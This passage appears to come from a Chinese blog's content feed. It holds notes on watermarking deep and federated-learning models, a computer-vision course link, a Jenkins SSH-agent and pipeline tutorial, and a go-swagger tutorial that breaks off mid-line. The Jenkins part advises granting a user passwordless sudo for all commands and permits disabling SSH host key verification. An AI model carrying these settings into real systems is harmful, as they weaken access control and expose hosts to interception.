过程<ul><li>对参与联邦学习的实体进行安全性分析，并评估他们的可信程度</li><li>集成安全方法，确保数据和模型的隐私</li></ul></li></ul></li><li>DNN水印<ul><li>水印需求<ul><li>机密性<ul><li>任何分析模型的人无法检测到模型是否带有水印</li></ul></li><li>保真度<ul><li>保持模型在主要任务上的性能</li></ul></li><li>可靠性<ul><li>确保模型所有者在IP验证期间的低误报率</li></ul></li><li>完整性<ul><li>防止其他方的误报</li></ul></li><li>通用性<ul><li>水印算法应该独立于模型</li></ul></li><li>鲁棒性<ul><li>从被攻击的模型中重构出正确水印的可能性</li></ul></li><li>容量<ul><li>嵌入多个水印的能力</li></ul></li><li>效率<ul><li>水印嵌入和验证过程产生的性能成本</li></ul></li><li>子主题</li></ul></li><li>攻击<ul><li>修剪攻击（Pruning Attack）<ul><li>将冗余的模型权重归零，也可以移除冗余的神经元、滤波器或层来修剪模型。</li></ul></li><li>微调（Fine Tuning Attack）<ul><li>重新训练模型并更新其权重，而不降低精度。</li></ul></li><li>覆盖攻击（Overwriting Attack）<ul><li>嵌入一个新的水印来替换原来的水印</li></ul></li><li>Wang and Kerschbaum Attack<ul><li>针对静态白盒水印算法，依赖视觉检查来改变水印模型的权重分布</li></ul></li><li>属性推断攻击（Property Inference Attack）<ul><li>训练辨别模型以区分带水印模型和不带水印的模型</li></ul></li><li>模糊攻击（Ambiguity Attack）<ul><li>在模型上伪造一个新的水印，使外部实体难以确定合法的水印所有者</li></ul></li></ul></li><li>验证过程访问模型参数的类型<ul><li>白盒<ul><li>完全访问模型（架构、参数、激活映射）</li><li>方法<ul><li>以二进制字符串或图像的形式，将信息隐藏至模型参数</li><li>激活映射</li><li>添加护照层（passport layer）</li></ul></li><li>典型方案<ul><li>目标模型M，加水印版本Mwat，秘密密钥Kext，特征提取函数Ext，投影函数Proj，秘密密钥Kproj，水印b，从水印模型Mwat提取的水印bext</li><li>提取模型特征，利用这些特征进行水印插入&#x2F;提取<ul><li>所获得的特征可以是模型权重的子集、从触发集中秘密选择的特定输入数据的模型激活图</li><li>使用特定正则化项Ewat正则化M<ul><li>依赖在水印空间定义的距离度量d，距离度量可以是汉明距离、铰链距离或者交叉熵</li><li>确保投影函数在预定的水印空间对水印进行编码</li></ul></li><li>通过损失函数参数化的微调操作导出带水印模型</li></ul></li><li>例子<ul><li>方案1<ul><li>特征提取函数涉及计算秘密选择的滤波器权重w的平均值</li><li>使用二进制交叉熵作为水印正则化项Ewat的距离度量d</li></ul></li><li>方案2<ul><li>特征提取函数由批量归一化权重中的缩放参数组成</li><li>铰链损失被用作水印正则化Ewat的距离度量d</li></ul></li></ul></li></ul></li></ul></li><li>黑盒<ul><li>通过提供输入和接收相关预测与模型交互，只能通过API执行验证过程</li><li>方法<ul><li>通过改变模型的行为对其添加水印</li><li>常用技术包括<ul><li>使用触发集训练模型</li></ul></li><li>每一个epoch训练期间，一个batch不是仅来自训练集，而是训练集和触发集之间的串联</li></ul></li><li>例子<ul><li>不同类型的输入<ul><li>内容水印：将有意义的内容添加到训练集的图像中。模型应该由内容触发，并返回相关的固定标签。</li><li>不相关水印：与模型的主要任务无关的图像。每个图像都有一个相关的标签，或者每个样本都可以有其特定的输出。</li><li>噪声水印：为训练集中的图像添加特定的噪声。然后，该模型将具有该特定噪声的任何图像分类为预定义的标签。</li></ul></li></ul></li></ul></li></ul></li></ul></li><li>联邦学习模型水印<ul><li>问题<ul><li>存在多个参与者</li><li>需要考虑参与方交换期间的威胁</li><li>在训练完成后对模型进行水印处理，或是开始训练之前嵌入水印，存在模型被窃取以及水印剔除的风险</li></ul></li><li>定义<ul><li>一个或多个参与者将水印插入共享模型的过程，遵循客户端-服务器框架</li><li>服务器<ul><li>负责给全局模型加水印</li></ul></li><li>客户端<ul><li>一个或多个客户端对模型更新添加水印，以便为全局模型添加水印</li></ul></li><li>服务器和客户端<ul><li>服务器和客户端协作，共同为全局模型添加水印</li></ul></li><li>水印需求<ul><li>容量<ul><li>避免插入不同客户端信息的冲突，需要足够的比特数</li></ul></li><li>通用性<ul><li>FL有许多额外的安全和隐私机制（如鲁棒聚合和差分隐私），水印需要独立地应用这些机制</li></ul></li><li>效率<ul><li>跨设备架构中，客户端的计算能力较低，需要考虑嵌入水印过程产生的成本</li></ul></li><li>保密性<ul><li>所有参与方未参与注册水印过程，应当没有水印被检测出</li></ul></li><li>鲁棒性<ul><li>每个参与者需要有唯一的一个水印，能够标识所有者</li></ul></li></ul></li></ul></li><li>相关工作<ul><li>WAFFLE<ul><li>B,G, Tekgul,et al.“Waffle: Watermarking in federated learning“，SRDS.2021</li><li>假设<ul><li>服务器是一个可信方，使用黑盒水印技术。利用触发集嵌入模型水印</li><li>客户端不能够使用后门、投毒或是嵌入自己的水印<ul><li>被激励最大限度提高全局模型准确率</li></ul></li><li>对手只能保存模型和应用模型</li><li>可以使用不需要客户端数据的触发集，WAFFLEPattern：一组包含随机图案的图像，背景有噪声<ul><li>WAFFLEPATTERN更好地保留了模型性能，并降低了通信和计算开销</li><li>弹性的水印去除技术，包括微调，修剪和逆向工程，如果不超过10%的客户端串通击败水印程序。</li></ul></li></ul></li><li>黑盒水印<ul><li>预训练<ul><li>使用触发集训练初始化的模型，直到该模型在该集合上具有良好的准确率</li></ul></li><li>再训练<ul><li>使用触发集微调模型，直到模型学习了水印</li></ul></li><li>PreTrain用于在第一轮之前将水印嵌入到模型中。在每一轮中，在聚合过程之后，服务器使用ReTrain将水印重新嵌入到模型中。</li></ul></li></ul></li><li>FedIPR<ul><li>Li B,et al. “FedIPR: Ownership verification for federated deep neural network models”, TPAMI, 2022</li><li>既有白盒水印也有黑盒水印<ul><li>白盒水印<ul><li>每个客户端生成一个随机秘密矩阵以及一个批量归一化层的位置，嵌入消息</li><li>损失：原始消息和重建消息之间的类似铰链的损失</li></ul></li><li>黑盒水印<ul><li>每个客户端在本地数据训练的小型CNN中使用投影梯度下降技术生成触发集</li><li>损失：和主任务的损失相同，但使用触发集作为输入</li></ul></li></ul></li></ul></li><li>FedTracker<ul><li>Shao S, et al. “Fedtracker:Furnishing ownership verification and traceability for federated learning model”, arxiv, 2022</li><li>假设<ul><li>服务器是一个可信方，不能访问与原始任务相关的数据</li><li>客户端可能是恶意的，也可能是诚实的。恶意客户端可以复制和分发模型，但需要遵循训练过程以最大限度提高全局准确率</li></ul></li><li>允许服务器嵌入全局黑盒水印，也可以嵌入特定于每个客户端的白盒水印<ul><li>全局黑盒水印<ul><li>使用WAFFLEPattern方法生成触发集</li><li>聚合之后嵌入</li></ul></li><li>白盒水印<ul><li>服务器为每个客户端生成一个随机秘密矩阵和指纹</li><li>损失：原始消息和重构消息之间类似铰链的损失</li></ul></li></ul></li></ul></li><li>Liu<ul><li>Liu X, et al.“Secure federated learing model verification: A client-side backdoor triggered watermarking scheme”,SMC,2021</li><li>客户端黑盒水印方案<ul><li>假设<ul><li>服务器是不可信的</li><li>客户端也可能是恶意的</li><li>验证过程中，一个完全值得信赖的第三方被招募为仲裁者</li><li>引入比例因子避免特定客户端在每一轮被选中<ul><li>客户端发送其乘以λ的模型权重<ul><li>近似于每次迭代都选择该客户端，并且水印更容易嵌入</li></ul></li></ul></li></ul></li><li>触发集<ul><li>由发起者创建具有给定标签的高斯噪声图像组成的触发集</li></ul></li></ul></li></ul></li><li>FedRight<ul><li>Chen J, et al. “Fedright: An effective model copyright protection for federated learning”, Computers &amp; Security, 2023</li><li>模型指纹（白盒）<ul><li>假设<ul><li>服务器是可信且诚实的</li><li>客户端可能不可信</li></ul></li><li>方法<ul><li>服务器从一组输入（关键样本）中生成对抗性示例</li><li>服务器提取每个预测的概率分布，并将其反馈至具有关键样本目标的检测器</li><li>验证过程中，由检测器预测对应的模型是否是好的</li></ul></li></ul></li></ul></li><li>FedCIP<ul><li>Liang J, Wang R.“FedCIP: Federated Client Intellectual Property Protection with Traitor Tracking”, arxiv, 2023</li><li>白盒水印方案<ul><li>假设<ul><li>服务器是诚实但好奇的，不能直接修改模型的参数</li><li>客户端可能是恶意的，可以发起模型窃取行为</li><li>触发集不依赖于原始数据</li></ul></li><li>方法<ul><li>对于每个客户端，水印在一个周期期间是唯一的<ul><li>如果该轮是循环的第一次迭代，则用新的水印替换先前的水印</li><li>否则进行小的更新增强水印</li></ul></li><li>Federated watermark进行水印验证<ul><li>给定周期的所有贡献者的水印的级联</li><li>如客户端泄露模型，可以通过计算具有高水印检测率的参与者与泄露模型的交集来识别</li></ul></li></ul></li></ul></li></ul></li><li>Yang<ul><li>Yang W, et al.“Watermarking in Secure FederatedLearming: A Verification Framework Based on Client-Side Backdooring”, arxiv,2022</li><li>黑盒水印方案<ul><li>方法<ul><li>使用基于置换的密钥和基于噪声的模式构建图像<ul><li>可以抵抗歧义攻击，无论是试图暴力破解密钥还是生成新的触发集</li></ul></li></ul></li></ul></li></ul></li><li>Merkle Sign<ul><li>Li F Q, et al, “Towards practical watermark for deep neural networks in federated learning”, arxiv, 2021</li><li>Li F Q, et al.“Merkle-Sign: Watermarking Framework for Deep Neural Networks in Federated Learning”, arxiv, 2021</li><li>假设<ul><li>服务器是可信的</li><li>客户端是诚实但好奇的</li></ul></li><li>使用Merkle树的公共验证协议&amp;#x20;<ul><li>服务器在每一轮使用嵌入函数将两条身份信息（密钥）插入全局模型中，一条标识服务器，另一条标识接收模型的客户端</li><li>服务器上传密钥元组和由水印嵌入函数生成的验证函数元组，转化为具有事件记录的merkle树</li><li>最后一轮，服务器将客户端生成的所有密钥嵌入全局模型并更新merkle树</li></ul></li><li>黑盒水印方案<ul><li>依赖于每个客户端的自动编码器</li></ul></li><li>白盒水印</li><li>防御<ul><li>歧义攻击<ul><li>使用授权的时间服务器或分散的共识协议进行授权</li></ul></li><li>破坏攻击<ul><li>应用多个水印</li></ul></li><li>叛徒跟踪<ul><li>为每个客户端嵌入唯一的水印</li></ul></li></ul></li><li>缺点<ul><li>缺少训练终止后识别叛徒客户端的协议，因为模型的水印同时来自所有客户端的信息</li></ul></li></ul></li><li>FedZKP<ul><li>Yang W, et al.“FedZKP: Federated Model Ownership Verification with Zero-knowledge Proof, arxiv, 2023</li><li>假设<ul><li>客户端是可信的</li><li>服务器是诚实但好奇的</li></ul></li><li>基于零知识证明的验证协议<ul><li>用户需要与可信机构共享其公钥验证模型所有权<ul><li>存在拦截密钥的攻击者</li><li>使用零知识证明协议解决，确保只有拥有水印中公钥相关联的私钥的个人才能证明</li></ul></li></ul></li><li>白盒水印<ul><li>每个客户端配备公钥和私钥</li><li>客户端公钥的散列嵌入到模型中</li></ul></li></ul></li><li>子主题</li></ul></li><li>讨论<ul><li>基于触发集的服务器端水印算法<ul><li>大多数方法通过在损失函数中添加正则化项，让模型在触发集上过拟合</li><li>大多数黑盒水印算法基于主任务数据集构建触发集</li><li>服务器没有自己的数据集，因此需要使用不相关或者基于噪声的输入（例如WafflePattern），或是从客户端提供的自动编码器生成触发集（例如Merkle Sign）<ul><li>分别学习两项任务可能会对Fedelity产生负面影响<ul><li>FedTracker使用持续学习和全局梯度记忆来防止先前学习的干扰</li></ul></li><li>容易遭到Evasion attack</li></ul></li></ul></li><li>聚合函数<ul><li>常见的聚合函数<ul><li>FedAvg<ul><li>在客户端执行多个epoch后，参数的平均</li><li>每个客户端的权重矩阵乘以一个缩放因子<ul><li>子主题<ul><li>n为所有客户端数据集样本的数量</li></ul></li><li>子主题</li></ul></li></ul></li></ul></li><li>水印方法应该独立于聚合函数</li><li>由于客户端的水印技术对嵌入消息和触发集敏感，因此他们保持远离彼此的更新<ul><li>所使用安全聚合技术，一部分的更新可能会因此被拒绝</li></ul></li><li>数据异构的情况，目前缺乏相关工作解决</li></ul></li><li>客户端选择<ul><li>考虑不同端嵌入水印时客户端选择的影响</li></ul></li><li>跨设备设置<ul><li>大部分方法处理的是少量客户端的情况</li><li>黑盒水印，该问题来自低计算能力</li><li>白盒水印，该问题来自嵌入容量</li></ul></li><li>差分隐私和同态加密<ul><li>差分隐私<ul><li>服务器和客户端之间（或直接在客户端之间）共享模型或梯度更新，存在对潜在攻击的担忧，例如成员推断</li><li>常见DP方法<ul><li>将高斯随机噪声引入到发送到聚合器的梯度中，从而添加额外的隐私保护层</li></ul></li></ul></li><li>同态加密<ul><li>客户端可以使用其公钥保护其模型更新，在将数据发送到服务器之前对其进行加密。服务器在加密空间中执行模型聚合，客户端可以在收到聚合的全局模型后使用其私钥对其进行解密。</li><li>适合S1场景（客户端添加水印），不适用于S1（服务器端嵌入水印）</li></ul></li></ul></li><li>非CS架构的联邦学习水印<ul><li>U型架构服务器端执行黑盒水印较为困难，其无法在模型上使用输入和标签</li></ul></li><li>来自客户端和服务器的攻击<ul><li>服务器可以控制所选择的参与者或如何聚合模型参数。它有时也清楚地了解客户在每一轮的参数。然而，它没有数据，也无法完全控制客户是否严格遵守培训程序。</li><li>客户端有自己的私有数据集，他们可以发送他们想要的更新。然而，他们无法控制服务器级别的更新。如果服务器想要避免客户端的子集对模型进行水印，它可以使用拜占庭攻击检测方法。</li></ul></li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《Deep Learning for Computer vision》-01</title>
      <link href="/knowledge/25.html"/>
      <url>/knowledge/25.html</url>
      
        <content type="html"><![CDATA[<p>《Deep Learning for Computer Vision》是密歇根大学开设的计算机视觉课程，课程涵盖算法、神经网络架构、视觉识别任务中网络训练和微调的工程实际技巧的培训。</p><p>课程资源</p><ul><li>课程网站：<a href="https://web.eecs.umich.edu/~justincj/teaching/eecs498/WI2022/">1</a></li><li>课程教材：<a href="https://www.deeplearningbook.org/">2</a></li><li>课程视频：<a href="https://www.youtube.com/watch?v=YnQJTfbwBM8&list=PL5-TkQAfAZFbzxjBHtzdVCWE0Zbhomg7r">3</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> knowledge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>项目开发-Jenkins篇</title>
      <link href="/technique/23.html"/>
      <url>/technique/23.html</url>
      
        <content type="html"><![CDATA[<p>Jenkins是一款开源 CI&amp;CD 软件，用于自动化各种任务，包括构建、测试和部署软件。其支持各种运行方式，可通过系统包、Docker 或者通过一个独立的 Java 程序。</p><h3 id="Jenkins节点"><a href="#Jenkins节点" class="headerlink" title="Jenkins节点"></a>Jenkins节点</h3><p>Jenkins中的节点是用于执行构建任务的计算机或计算机集群，可以通过配置界面、CLI或API进行配置和管理，可以分为主节点和代理节点，用于实现任务执行的并行化、负载均衡和资源隔离。</p><p>通常在安装Jenkins这台服务器默认就是一个主节点（俗称master），其他相对于这台安装Jenkins的机器都称为从节点或代理节点（俗称slaves, agent）。</p><ul><li><p>主节点是Jenkins的核心节点，负责管理整个Jenkins系统的配置和任务分发。主节点可以执行一部分构建任务，但通常不建议在主节点上执行耗时较长或资源占用较高的任务，以免影响Jenkins的整体性能。</p></li><li><p>代理节点是由主节点管理的其他计算机或计算机集群。代理节点可以执行构建任务，并将结果返回给主节点。代理节点可以根据需要添加多个，以提供更多的计算资源和并行执行能力。</p></li></ul><p>不同的Jenkins任务有不同的操作环境需求，比如部署基于IIS服务的需要windows操作系统，构建IOS应用需要MacOs，构建脚本是shell的需要Linux操作系统。</p><p>在 Jenkins 中添加一个 SSH 节点（称为 SSH Slave 或 SSH Agent），需要通过 SSH 连接到远程主机，并让 Jenkins 控制该节点上的构建任务。以下是具体的步骤：</p><h4 id="节点配置（Launch-agents-via-SSH）-环境准备"><a href="#节点配置（Launch-agents-via-SSH）-环境准备" class="headerlink" title="节点配置（Launch agents via SSH）-环境准备"></a>节点配置（Launch agents via SSH）-环境准备</h4><ul><li><p>Jenkins 已安装并运行。</p></li><li><p>安装SSH Build Agents, Credentials插件。</p></li><li><p>远程主机的 SSH 访问权限，并且该主机上安装了 Java。</p><pre><code>#安装OpenJDK 11sudo apt updatesudo apt install openjdk-11-jdk#检查是否安装成功java -version</code></pre></li><li><p>远程主机的 IP 地址或主机名、SSH 端口号、用户名和密码（用户名和密码认证）或私钥（密钥认证）。</p></li></ul><h4 id="节点配置（Launch-agents-via-SSH）-添加节点"><a href="#节点配置（Launch-agents-via-SSH）-添加节点" class="headerlink" title="节点配置（Launch agents via SSH）-添加节点"></a>节点配置（Launch agents via SSH）-添加节点</h4><p>首先在节点管理处新增“固定节点”</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/develop/jenkins/node.png" alt="node entry"></p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/develop/jenkins/new_node.png" alt="new node"></p><p>根据信息配置节点，填写远程主机信息以及SSH凭据。选项说明如下：</p><ul><li>Remote root directory: 输入 Jenkins 代理将运行工作的远程主机上的目录路径。</li><li>Labels: 输入该节点的标签（可选，但有助于在构建时指定节点）。</li><li>Usage: 通常选择 “Only build jobs with label expressions matching this node”。</li><li>Launch method: 选择 “Launch agents via SSH”。</li><li>Host: 输入远程主机的 IP 地址或主机名。</li><li>Credentials: 点击 “Add” 按钮，然后在弹出的对话框中添加 SSH 凭据（用户名和密码或用户名和私钥）。<ul><li>如果使用用户名和私钥，点击 “Kind” 下拉菜单选择 “SSH Username with private key”。</li><li>在 “ID” 栏输入一个识别名。</li><li>在 “Username” 栏输入远程主机的用户名。</li><li>在 “Private Key” 部分，输入私钥或者上传私钥文件。</li></ul></li><li>Host Key Verification Strategy: 根据安全需求选择一个选项，如果不介意安全风险，可以选择 “Non verifying Verification Strategy”。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/develop/jenkins/node_config1.png" alt="node configure"></p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/develop/jenkins/node_config2.png" alt="node configure"></p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/develop/jenkins/node_config3.png" alt="node configure"></p><h4 id="节点配置（Launch-agents-via-SSH）-启动节点"><a href="#节点配置（Launch-agents-via-SSH）-启动节点" class="headerlink" title="节点配置（Launch agents via SSH）-启动节点"></a>节点配置（Launch agents via SSH）-启动节点</h4><p>通过点击节点旁边的 Launch agent 来启动。如果配置正确，Jenkins 将通过 SSH 连接到远程节点并启动代理。点击状态可查看启动信息，若启动失败，可根据日志中的报错信息修改。</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/develop/jenkins/node_launch.png" alt="node launch"></p><h3 id="Jenkins任务"><a href="#Jenkins任务" class="headerlink" title="Jenkins任务"></a>Jenkins任务</h3><p>Jenkins中的任务（Job）是指要执行的特定操作或一系列操作的定义。任务通过配置和设置来定义其行为和执行方式，包括触发器、构建步骤、构建参数、构建环境等。通过任务的配置和管理，可以实现自动化的构建、测试和部署流程。</p><p>Jenkins Job中的一些概念如下：</p><ul><li><p>任务类型：Jenkins支持多种任务类型，例如自由风格项目、流水线项目、多配置项目等。每种任务类型都有不同的配置选项和执行方式。</p></li><li><p>构建触发器：任务可以通过不同的触发器来触发构建操作。常见的触发器包括定时触发、版本控制系统的变更触发、其他任务的成功触发等。</p></li><li><p>构建步骤：任务可以定义一系列的构建步骤，每个步骤执行特定的操作。例如，可以包括代码拉取、编译、测试、部署等步骤。</p></li><li><p>构建参数：任务可以定义输入参数，允许用户在执行任务时提供参数值。参数可以是文本、下拉列表、布尔值等类型。</p></li><li><p>构建环境：任务可以定义构建环境，包括设置环境变量、配置工具路径、指定构建代理节点等。</p></li><li><p>构建历史和报告：Jenkins会记录每次任务的构建历史，包括构建状态、执行时间、控制台输出等。任务还可以生成构建报告，用于查看构建结果和分析构建过程。</p></li><li><p>插件扩展：Jenkins提供了丰富的插件生态系统，可以扩展任务的功能和特性。通过安装和配置插件，可以实现更多的自定义和集成。</p></li></ul><h4 id="创建任务"><a href="#创建任务" class="headerlink" title="创建任务"></a>创建任务</h4><p>以创建流水线任务为例，任务涉及通用、高级项目选项和流水线。通用配置包含上述提及的构建触发器，添加扩展后的扩展选项等。</p><p>针对推送至仓库后的构建，以gitlab webhook（<a href="https://zhuanlan.zhihu.com/p/133449879">webhook介绍</a>）为例，需要先安装“Gitlab”插件，接着任务配置中，构建触发器选择“Build when a change is pushed to Gitlab”，之后在gitlab对应的项目中，选择设置中的webhooks，将前一步的GitLab webhook URL和高级中的Secret Token填入，出发事件根据自己的需求设置，例如，当代码推送至dev分支时触发，则勾选”Push events-wildcard pattern”，填写分支名称”dev”。最后，点击测试中的对应事件（push events），若返回200，则说明配置成功。</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/develop/jenkins/jenkins_job.png" alt="Jenkins job"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/develop/jenkins/job_config.png" alt="Job configure"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/develop/jenkins/job_config2.png" alt="Job configure"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/develop/jenkins/gitlab_hook.png" alt="gitlab webhooks"></p><p>流水线是项目运行需要执行的一系列操作，具体见下小节。</p><h3 id="Jenkins-Pipeline"><a href="#Jenkins-Pipeline" class="headerlink" title="Jenkins Pipeline"></a>Jenkins Pipeline</h3><p>Jenkins Pipeline（或简称为 “Pipeline”）是一套插件，将持续交付的实现和实施集成到 Jenkins 中。Pipelines 由多个步骤（step）组成，允许构建、测试和部署应用。当一个步骤运行成功时继续运行下一个步骤。 当任何一个步骤执行失败时，Pipeline 的执行结果也为失败。</p><p>在 Linux、BSD 和 Mac OS（类 Unix ）系统中的 shell 命令， 对应于 Pipeline 中的一个 sh 步骤（step）。</p><p>以下是简单的hello word脚本。</p><pre class=" language-Pipeline"><code class="language-Pipeline">pipeline &#123;    agent any    stages &#123;        stage('Build') &#123;            steps &#123;                sh 'echo "Hello World"'                sh '''                    echo "Multiline shell steps works too"                    ls -lah                '''            &#125;        &#125;    &#125;&#125;</code></pre><ul><li><p>pipeline 定义一个流水线脚本</p></li><li><p>agent 指示 Jenkins 为整个流水线分配一个执行器（在 Jenkins 环境中的任何可用代理&#x2F;节点上）和工作区。</p></li><li><p>stages 全部的工作都在这里执行</p></li><li><p>stage 每个工作开始</p></li><li><p>steps jenkinsfile 声明式脚本往这里面写</p></li><li><p>echo 写一个简单的字符串到控制台输出。</p></li></ul><p>以构建项目docker镜像为例，用Pipleine script编写部署脚本。项目根据镜像文件Dockerfile构建，拉取代码等一系列命令都在Dockerfile中。因此，此时项目运行的步骤包含：切换至镜像目录→暂停镜像→构建镜像→启动镜像→删除多余的镜像（避免镜像堆积导致内存占用）。</p><p>此时命令执行的权限与节点认证时用户的权限有关，涉及sudo权限的，需要给当前用户赋予sudo权限，并需要设置为不需要输入密码（在&#x2F;etc&#x2F;sudoer文件中增加<code>Usename ALL=NOPASSWD: ALL</code>）。</p><pre><code>pipeline &#123;    agent &#123;     node &#123;            label &#39;代理节点标签&#39;        &#125;    &#125;    stages &#123;        stage(&#39;Deploy&#39;) &#123;            steps &#123;                script &#123;                    try &#123;                        sh &#39;cd 镜像文件所在目录 &amp;&amp; sudo docker-compose down &amp;&amp; sudo docker-compose build --no-cache  &amp;&amp; sudo docker-compose up -d&#39;                        sh &#39;sudo docker image prune -f -a --filter \&#39;until=24h\&#39;&#39;                        echo &#39;部署完成&#39;                    &#125; catch (Exception e) &#123;                        error &quot;Command failed with exception: $&#123;e&#125;&quot;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;</code></pre><p>参考资料：</p><p><a href="https://www.jenkins.io/doc/">Jenkins官方英文文档</a></p><p><a href="https://www.jenkins.io/zh/doc/">Jenkins官方中文文档</a></p><p><a href="https://blog.csdn.net/wlddhj/article/details/134990223">Jenkins节点 node、凭据 credentials、任务 job</a></p><p><a href="https://www.teambition.com/community/1917.html">jenkins添加ssh节点（SSH Server）教程</a></p>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Jenkins </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>项目开发-swagger篇</title>
      <link href="/technique/22.html"/>
      <url>/technique/22.html</url>
      
        <content type="html"><![CDATA[<h3 id="OpenAPI规范"><a href="#OpenAPI规范" class="headerlink" title="OpenAPI规范"></a>OpenAPI规范</h3><p><a href="https://openapi.apifox.cn/">OpenAPI 规范</a>（OpenAPI Specification），是定义一个标准的、与具体编程语言无关的RESTful API的规范。</p><blockquote><p><a href="https://restful.p2hp.com/">RESTful</a> (REpresentational State Transfer)风格是一种基于HTTP协议设计Web API的软件架构风格，由Roy Fielding在2000年提出。它强调使用HTTP动词来表示对资源的操作（GET、POST、PUT、PATCH、DELETE等），并通过URI表示资源的唯一标识符。</p></blockquote><p>OpenAPI 规范可以在“不接触任何程序源代码和文档、不监控网络通信”的情况下理解一个服务的作用。遵循 OpenAPI 规范来定义 API，以使用文档生成工具来展示。主要的Swagger工具包括：</p><ul><li>Swagger Editor：基于浏览器的编辑器，可以在其中编写 OpenAPI 定义。</li><li>Swagger UI：将 OpenAPI 定义渲染为交互式文档。</li><li>Swagger Codegen：根据 OpenAPI 定义生成服务器存根和客户端库。</li><li>Swagger Editor Next (beta)：基于浏览器的编辑器，可以在其中编写和审查 OpenAPI 和 AsyncAPI 定义。</li><li>Swagger Core：用于创建、使用和处理 OpenAPI 定义的 Java 相关库。</li><li>Swagger Parser：用于解析 OpenAPI 定义的独立库</li><li>Swagger APIDom：为描述各种描述语言和序列化格式的 API 提供单一、统一的结构。</li></ul><h3 id="Swagger"><a href="#Swagger" class="headerlink" title="Swagger"></a>Swagger</h3><p><a href="https://swagger.io/">Swagger</a> 是一套围绕 OpenAPI 规范构建的开源工具，可帮助开发人员设计、构建、记录和使用 REST API，支持文档在线自动生成以及接口功能测试。基于OpenAPI规范编写注解或通过扫描代码去生成注解，就能生成统一标准的接口文档和一系列 <a href="https://github.com/swagger-api">Swagger 工具</a>。</p><p>以下以<a href="https://github.com/swaggo/swag">go swagger</a>为例，说明如何为代码自动生成接口文档。</p><p><strong>环境准备</strong></p><blockquote><p><strong>安装swgger</strong></p></blockquote><p><code>go install github.com/swaggo/swag/cmd/swag@latest</code></p><blockquote><p><strong>支持的web框架</strong></p></blockquote><pre><code>ginbuffalonet/http...</code></pre><p><strong>swagger使用</strong></p><p>接口文档的生成过程：首先按照规范给接口代码（controller层）添加声明式注释，接着使用swagger工具扫描代码自动生成api接口文档数据，然后渲染在线接口文档页面。 </p><blockquote><p><strong>添加注释</strong></p></blockquote><p>注释规范说明</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/API.png" alt="api declarative comments format"></p><pre class=" language-shell"><code class="language-shell">@Summary      摘要@Description  详细的说明@Tags         每个API操作的标签列表，以逗号分隔。@Accept       API可以使用的MIME类型列表，只影响具有请求正文的操作，例如POST、PUT、PATCH@Produce      可以产生的 MIME 类型列表，MIME 类型可以简单的理解为响应类型，例如：json、xml、html 等等@Param        参数格式，从左到右分别为：参数名、入参类型、数据类型、是否必填、注释@Success      响应成功，从左到右分别为：状态码、参数类型、数据类型、注释@Failure      响应失败，从左到右分别为：状态码、参数类型、数据类型、注释@Router       路由，从左到右分别为：路由地址，HTTP 方法</code></pre><p>具体例子</p><pre><code>// ShowAccount godoc////@SummaryShow an account//@Descriptionget string by ID//@Tagsaccounts//@Acceptjson//@Producejson//@Paramidpathinttrue&quot;Account ID&quot;//@Success200&#123;object&#125;model.Account//@Failure400&#123;object&#125;httputil.HTTPError//@Failure404&#123;object&#125;httputil.HTTPError//@Failure500&#123;object&#125;httputil.HTTPError//@Router/accounts/&#123;id&#125; [get]// UploadAccountImage godoc////@SummaryUpload account image//@DescriptionUpload file//@Tagsaccounts//@Acceptmultipart/form-data//@Producejson//@Paramidpathinttrue&quot;Account ID&quot;//@ParamfileformDatafiletrue&quot;account image&quot;//@Success200&#123;object&#125;controller.Message//@Failure400&#123;object&#125;httputil.HTTPError//@Failure404&#123;object&#125;httputil.HTTPError//@Failure500&#123;object&#125;httputil.HTTPError//@Router/accounts/&#123;id&#125;/images [post]</code></pre><blockquote><p><strong>生成接口文档</strong></p></blockquote><p>在包含main.go文件的项目根目录运行<code>swag init</code>，解析注释并生成需要的文件（<code>docs</code>文件夹和<code>docs/docs.go</code>）</p><pre class=" language-shell"><code class="language-shell"># swag 生成命令swag init . </code></pre><p>如果部分接口不需要生成接口文档，则使用排除命令。</p><pre class=" language-shell"><code class="language-shell"># swag 排除命令swag init -d ./ --exclude ./app/api/v2</code></pre><p>确保导入了生成的<code>docs/docs.go</code>文件，这样特定的配置文件才会被初始化。</p><pre><code>//注册路由处import (   _ &quot;xxx/docs&quot;   //导入生成的docs)</code></pre><p>(可选) 可以使用<code>fmt</code>格式化 SWAG 注释。</p><pre><code>swag fmt</code></pre><blockquote><p><strong>渲染文档数据</strong></p></blockquote><p>注册swagger api相关路由，可以自定义文档格式，也可使用现有工具的渲染，例如gin-swagger的swaggerFiles.Handler</p><pre><code>    swagger := e.Group(&quot;swagger&quot;, middleware.SwaggerBasicAuth())    &#123;        swagger.GET(&quot;/*any&quot;, api.Swagger.HandleReDoc)    &#125;</code></pre><p>项目运行后，浏览器访问定义的文档地址即可查看</p><blockquote><p><strong>Swag cli</strong></p></blockquote><pre class=" language-shell"><code class="language-shell">swag init -hNAME:swag init - Create docs.goUSAGE:swag init [command options] [arguments...]OPTIONS:--generalInfo value, -g value          API通用信息所在的go源文件路径，如果是相对路径则基于API解析目录 (默认: 